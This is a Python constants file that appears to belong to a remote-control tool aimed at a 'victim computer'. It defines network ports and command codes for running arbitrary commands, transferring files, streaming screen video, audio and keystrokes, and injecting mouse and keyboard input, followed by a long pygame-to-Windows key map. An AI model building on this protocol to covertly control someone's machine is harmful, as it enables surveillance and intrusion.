"""
This file will contain all the constants used in the program
"""

# TODO - maybe clean up this import to just be 'import pygame.locals' ?
from pygame.locals import *

# port number for initial connection and sending commands
# this socket will also be used for mouse & keyboard control
CMD_PORT = 42967
# port number for receiving video stream from victim computer
VIDEO_PORT = 42968
# port number for sending input from pygame to victim computer
INPUT_PORT = 42969

# change directory and list directory contents
CHANGE_DIR = 1
LIST_DIR = 2
# upload and download files from/to attacker
UPLOAD = 3
DOWNLOAD = 4
# run an arbitrary comamnd
RUN_CMD = 5
# start and end video, mouse, audio, and keyboard streams
START_VIDEO = 6
END_VIDEO = 7
START_MOUSE = 8
END_MOUSE = 9
START_AUDIO = 10
END_AUDIO = 11
START_KEYS = 13
END_KEYS = 14
# end the process (on the victim's computer)
KILL_PROC = 12
# constants for controlling the mouse and keyboard
MOUSE_POS = 17 # this will be followed by X, Y coords for the mouse
MOUSE_DOWN = 18 # this will be followed by MOUSE_LEFT, MOUSE_RIGHT, or MOUSE_MIDDLE
MOUSE_UP = 19 # same as MOUSE_DOWN
MOUSE_LEFT = 20
MOUSE_RIGHT = 21
MOUSE_MIDDLE = 22
MOUSE_WHEEL = 23 # this will be followed by a number to specify the scroll amount
KEY_DOWN = 24 # this will be followed by the code of the key pressed (from KEY_DICT)
KEY_UP = 25 # same as KEY_DOWN
START_INPUTS = 26 # beginning of input list
END_INPUTS = 27 # end of input list

MOUSE_DICT = { # dictionary to map pygame mouse numbers to MOUSE_LEFT, MOUSE_RIGHT, and MOUSE_MIDDLE
	1: MOUSE_LEFT,
	2: MOUSE_MIDDLE,
	3: MOUSE_RIGHT
}

KEY_DICT = { # this is a dictionary to map pygame key constants to Windows virtual-key codes
	K_BACKSPACE: 0x08, #   \b      backspace
	K_TAB: 0x09, #         \t      tab
	K_CLEAR: 0x0C, #               clear
	K_RETURN: 0x0D, #      \r      return
	K_PAUSE: 0x13, #               pause
	K_ESCAPE: 0x1B, #      ^[      escape
	K_SPACE: 0x20, #               space
	K_EXCLAIM: 0x31, #     !       exclaim - same key as 1
	K_QUOTEDBL: 0xDE, #    "       quotedbl - same key as '
	K_HASH: 0x33, #        #       hash - same key as 3
	K_DOLLAR: 0x34, #      $       dollar - same key as 4
	K_AMPERSAND: 0x37, #   &       ampersand - same key as 7
	K_QUOTE: 0xDE, #               quote - same key as "
	K_LEFTPAREN: 0x39, #   (       left parenthesis - same key as 9
	K_RIGHTPAREN: 0x30, #  )       right parenthesis - same key as 0
	K_ASTERISK: 0x38, #    *       asterisk - same key as 8
	K_PLUS: 0xBB, #        +       plus sign - same key as =
	K_COMMA: 0xBC, #       ,       comma - same key as <
	K_MINUS: 0xBD, #       -       minus sign - same key as _
	K_PERIOD: 0xBE, #      .       period - same key as >
	K_SLASH: 0xBF, #       /       forward slash - same key as ?
	K_0: 0x30, #           0       0 - same key as )
	K_1: 0x31, #           1       1 - same key as !
	K_2: 0x32, #           2       2 - same key as @
	K_3: 0x33, #           3       3 - same key as #
	K_4: 0x34, #           4       4 - same key as $
	K_5: 0x35, #           5       5 - same key as %
	K_6: 0x36, #           6       6 - same key as ^
	K_7: 0x37, #           7       7 - same key as &
	K_8: 0x38, #           8       8 - same key as *
	K_9: 0x39, #           9       9 - same key as (
	K_COLON: 0xBA, #       :       colon - same key as ;
	K_SEMICOLON: 0xBA, #   ;       semicolon - same key as :
	K_LESS: 0xBC, #        <       less-than sign - same key as ,
	K_EQUALS: 0xBB, #      =       equals sign - same key as +
	K_GREATER: 0xBE, #     >       greater-than sign - same key as .
	K_QUESTION: 0xBF, #    ?       question mark - same key as /
	K_AT: 0x32, #          @       at - same key as 2
	K_LEFTBRACKET: 0xDB, # [       left bracket - same key as {
	K_BACKSLASH: 0xDC, #   \       backslash - same key as |
	K_RIGHTBRACKET: 0xDD, # ]      right bracket - same key as }
	K_CARET: 0x36, #       ^       caret - same key as 6
	K_UNDERSCORE: 0xBD, #  _       underscore - same key as -
	K_BACKQUOTE: 0xC0, #   `       grave - same key as ~
	K_a: 0x41, #           a       a
	K_b: 0x42, #           b       b
	K_c: 0x43, #           c       c
	K_d: 0x44, #           d       d
	K_e: 0x45, #           e       e
	K_f: 0x46, #           f       f
	K_g: 0x47, #           g       g
	K_h: 0x48, #           h       h
	K_i: 0x49, #           i       i
	K_j: 0x4A, #           j       j
	K_k: 0x4B, #           k       k
	K_l: 0x4C, #           l       l
	K_m: 0x4D, #           m       m
	K_n: 0x4E, #           n       n
	K_o: 0x4F, #           o       o
	K_p: 0x50, #           p       p
	K_q: 0x51, #           q       q
	K_r: 0x52, #           r       r
	K_s: 0x53, #           s       s
	K_t: 0x54, #           t       t
	K_u: 0x55, #           u       u
	K_v: 0x56, #           v       v
	K_w: 0x57, #           w       w
	K_x: 0x58, #           x       x
	K_y: 0x59, #           y       y
	K_z: 0x5A, #           z       z
	K_DELETE: 0x2E, #              delete
	K_KP0: 0x60, #                 keypad 0
	K_KP1: 0x61, #                 keypad 1
	K_KP2: 0x62, #                 keypad 2
	K_KP3: 0x63, #                 keypad 3
	K_KP4: 0x64, #                 keypad 4
	K_KP5: 0x65, #                 keypad 5
	K_KP6: 0x66, #                 keypad 6
	K_KP7: 0x67, #                 keypad 7
	K_KP8: 0x68, #                 keypad 8
	K_KP9: 0x69, #                 keypad 9
	K_KP_PERIOD: 0x6E, #   .       keypad period
	K_KP_DIVIDE: 0x6F, #   /       keypad divide
	K_KP_MULTIPLY: 0x6A, # *       keypad multiply
	K_KP_MINUS: 0x6D, #    -       keypad minus
	K_KP_PLUS: 0x6B, #     +       keypad plus
	K_KP_ENTER: 0x0D, #    \r      keypad enter
	# should K_KP_EQUALS correspond to VK_SEPARATOR?
	# mapping it to the normal plus key for now
	K_KP_EQUALS: 0xBB, #   =       keypad equals - mapped to same key as +
	K_UP: 0x26, #                  up arrow
	K_DOWN: 0x28, #                down arrow
	K_RIGHT: 0x27, #               right arrow
	K_LEFT: 0x25, #                left arrow
	K_INSERT: 0x2D, #              insert
	K_HOME: 0x24, #                home
	K_END: 0x23, #                 end
	K_PAGEUP: 0x21, #              page up
	K_PAGEDOWN: 0x22, #            page down
	K_F1: 0x70, #                  F1
	K_F2: 0x71, #                  F2
	K_F3: 0x72, #                  F3
	K_F4: 0x73, #                  F4
	K_F5: 0x74, #                  F5
	K_F6: 0x75, #                  F6
	K_F7: 0x76, #                  F7
	K_F8: 0x77, #                  F8
	K_F9: 0x78, #                  F9
	K_F10: 0x79, #                 F10
	K_F11: 0x7A, #                 F11
	K_F12: 0x7B, #                 F12
	# realistically, keys F13 to F15 will never be used
	# but I'll keep these keys in for completeness
	K_F13: 0x7C, #                 F13
	K_F14: 0x7D, #                 F14
	K_F15: 0x7F, #                 F15
	K_NUMLOCK: 0x90, #             numlock
	K_CAPSLOCK: 0x14, #            capslock
	K_SCROLLOCK: 0x91, #           scrollock
	K_RSHIFT: 0xA1, #              right shift
	K_LSHIFT: 0x10, #              left shift
	K_RCTRL: 0xA3, #               right control
	K_LCTRL: 0xA2, #               left control
	# the virtual-key codes for ALT seems to be VK_LMENU and VK_RMENU
	# this seems to be the case because VK_MENU corresponds to the ALT key
	K_RALT: 0xA5, #                right alt
	K_LALT: 0xA4, #                left alt
	# the "meta" key doesn't seem to be a thing on standard keyboards
	#K_RMETA: 0x0D, #               right meta
	#K_LMETA: 0x0D, #               left meta
	K_LSUPER: 0x5B, #              left Windows key
	K_RSUPER: 0x5C, #              right Windows key
	# no idea what the "mode shift" key is
	#K_MODE: 0x0D, #                mode shift
	K_HELP: 0x2F, #                help
	K_PRINT: 0x2C, #               print screen
	# the SysRq key probably never gets used
	# is on the same key as Print Screen, but commenting out anyways
	#K_SYSREQ: 0x0D, #              sysrq
	# break probably isn't used much either
	#K_BREAK: 0x0D, #               break
	# not sure what's meant by "menu" and "power"
	#K_MENU: 0x0D, #                menu
	#K_POWER: 0x0D, #               power
	# probably only on european keyboards???
	#K_EURO: 0x0D #                 Euro
}